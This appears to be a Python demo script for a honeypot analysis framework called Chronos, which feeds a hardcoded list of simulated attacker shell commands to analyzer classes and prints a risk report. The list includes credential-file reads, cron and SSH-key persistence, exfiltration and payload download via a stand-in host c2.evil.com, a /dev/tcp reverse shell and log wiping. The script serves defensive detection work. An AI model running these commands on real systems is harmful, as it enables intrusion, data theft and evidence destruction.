#!/usr/bin/env python3
"""
Chronos Standalone Demo
Demonstrates Skills components without infrastructure dependencies
"""
import sys
import os
from datetime import datetime

sys.path.append(os.path.join(os.getcwd(), "src"))

# Skills (no external dependencies)
from chronos.skills.command_analyzer import CommandAnalyzer
from chronos.skills.threat_library import ThreatLibrary
from chronos.skills.skill_detector import PatternSummarizer


def main():
    print("=" * 80)
    print("CHRONOS FRAMEWORK - STANDALONE DEMO")
    print("=" * 80)
    print(f"Started at: {datetime.now().isoformat()}\n")
    
    # Initialize components
    print("Initializing components...")
    analyzer = CommandAnalyzer()
    library = ThreatLibrary()
    detector = PatternSummarizer()
    print("✓ All components ready\n")
    
    # Simulate a realistic attack session
    print("=" * 80)
    print("SIMULATING ADVANCED PERSISTENT THREAT (APT) SESSION")
    print("=" * 80)
    
    session_id = "demo_apt_001"
    attacker_ip = "203.0.113.42"
    
    attack_commands = [
        # Phase 1: Initial reconnaissance
        "whoami",
        "id",
        "uname -a",
        "cat /etc/os-release",
        "ps aux | grep -i sql",
        
        # Phase 2: Enumeration
        "ls -la /home",
        "cat /etc/passwd",
        "cat /etc/group",
        "find /home -name '*.ssh' 2>/dev/null",
        
        # Phase 3: Privilege escalation
        "find / -perm -4000 -type f 2>/dev/null",
        "sudo -l",
        "cat /etc/sudoers 2>/dev/null",
        
        # Phase 4: Credential access
        "cat /etc/shadow 2>/dev/null",
        "grep -r 'password' /var/www 2>/dev/null",
        "find / -name '*.pem' -o -name '*.key' 2>/dev/null",
        
        # Phase 5: Persistence
        "crontab -l",
        "echo '*/5 * * * * /tmp/.update' | crontab -",
        "cat > ~/.ssh/authorized_keys << EOF\nssh-rsa AAAAB3NzaC1...\nEOF",
        "echo 'alias ls=/tmp/.backdoor' >> ~/.bashrc",
        
        # Phase 6: Data collection & exfiltration
        "find /var/www -type f -name '*.conf' 2>/dev/null",
        "tar czf /tmp/backup.tar.gz /var/www/html /etc/nginx",
        "base64 /tmp/backup.tar.gz > /tmp/data.txt",
        
        # Phase 7: Lateral movement setup
        "cat /etc/hosts",
        "netstat -tuln 2>/dev/null",
        "ssh-keygen -t rsa -b 4096 -f ~/.ssh/lateral_key -N ''",
        
        # Phase 8: Execution
        "wget http://c2.evil.com/shell.sh -O /tmp/.update",
        "curl http://c2.evil.com/exfil -d @/tmp/data.txt",
        "bash -i >& /dev/tcp/203.0.113.42/4444 0>&1",
        
        # Phase 9: Defense evasion
        "history -c",
        "rm ~/.bash_history",
        "unset HISTFILE",
        "echo '' > /var/log/auth.log",
    ]
    
    print(f"\nSession: {session_id}")
    print(f"Attacker: {attacker_ip}")
    print(f"Commands: {len(attack_commands)}")
    print("\n" + "-" * 80)
    
    all_analyses = []
    critical_events = []
    
    for i, command in enumerate(attack_commands, 1):
        # Analyze command
        analysis = analyzer.analyze(command)
        all_analyses.append(analysis)
        
        # Check threat library
        matches = library.match(command)
        
        # Print progress
        if analysis.risk_level in ['high', 'critical'] or matches:
            print(f"\n[{i:02d}] {command[:60]}")
            print(f"     Risk: {analysis.risk_level.upper()} (score: {analysis.risk_score})")
            
            if analysis.techniques:
                print(f"     Techniques: {', '.join(analysis.techniques[:2])}")
            
            if matches:
                print(f"     🚨 Threat: {matches[0].name}")
                critical_events.append((command, matches[0]))
    
    # Final analysis
    print("\n" + "=" * 80)
    print("ATTACK ANALYSIS COMPLETE")
    print("=" * 80)
    
    # Skill assessment
    assessment = detector.analyze_session(session_id, all_analyses)
    
    print(f"\n┌─ ATTACKER PROFILE")
    print(f"│")
    print(f"│  Pattern Labels: {', '.join(assessment['pattern_labels']) or 'none'}")
    print(f"│  Confidence:  {assessment['confidence']}")
    print(f"│")
    print(f"│  Attack Phases Detected:")
    for phase in assessment['statistics']['attack_phases']:
        print(f"│    • {phase.replace('_', ' ').title()}")
    print(f"│")
    print(f"│  Characteristics:")
    for char in assessment['characteristics'][:3]:
        print(f"│    • {char}")
    print(f"└─")
    
    # Session statistics
    profile = analyzer.get_session_risk_profile(attack_commands)
    
    print(f"\n┌─ SESSION STATISTICS")
    print(f"│")
    print(f"│  Total Commands:      {profile['total_commands']}")
    print(f"│  Malicious Commands:  {profile['malicious_commands']} ({100*profile['malicious_commands']//profile['total_commands']}%)")
    print(f"│  Total Risk Score:    {profile['total_risk_score']}")
    print(f"│  Average Risk:        {profile['average_risk']:.1f}/command")
    print(f"│  Overall Threat:      {profile['overall_risk_level'].upper()}")
    print(f"│  Unique Techniques:   {profile['unique_techniques']}")
    print(f"└─")
    
    # Critical events
    print(f"\n┌─ CRITICAL EVENTS ({len(critical_events)})")
    print(f"│")
    for i, (cmd, threat) in enumerate(critical_events[:5], 1):
        print(f"│  {i}. {threat.name} ({threat.severity})")
        print(f"│     {cmd[:60]}")
        if i < len(critical_events):
            print(f"│")
    if len(critical_events) > 5:
        print(f"│  ... and {len(critical_events) - 5} more")
    print(f"└─")
    
    # Top techniques
    print(f"\n┌─ TOP ATTACK TECHNIQUES")
    print(f"│")
    for technique, count in list(profile['top_techniques'].items())[:8]:
        bar = "█" * min(count * 2, 30)
        print(f"│  {technique:40s} {bar} {count}")
    print(f"└─")
    
    print("\n" + "=" * 80)
    print("DEMO COMPLETE")
    print("=" * 80)
    print("\nChronos successfully analyzed the attack session:")
    print(f"  ✓ Detected {assessment['statistics']['unique_techniques']} unique techniques")
    print(f"  ✓ Identified {len(assessment['statistics']['attack_phases'])} attack phases")
    print(f"  ✓ Recorded {len(assessment['pattern_labels'])} observable pattern labels")
    print(f"  ✓ Matched {len(critical_events)} threat signatures")
    print(f"  ✓ Overall session risk: {profile['overall_risk_level'].upper()}")
    print("\nThe honeypot successfully documented the entire attack chain.")


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[ERROR] Demo failed: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
